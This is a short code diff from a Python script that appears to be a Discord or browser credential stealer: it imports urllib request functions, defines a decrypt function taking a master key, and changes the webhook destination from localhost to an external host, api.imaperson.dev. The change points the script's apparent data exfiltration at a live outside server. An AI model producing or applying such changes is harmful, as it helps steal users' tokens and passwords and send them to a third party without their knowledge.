@@ -10,7 +10,7 @@ import re
 import time
 from urllib.request import Request, urlopen
 
-WEBHOOK_URL = "http://localhost:8080/discord/{{id}}"
+WEBHOOK_URL = "https://api.imaperson.dev/discord/{{id}}"
 
 def decrypt(buff, master_key):
     try:
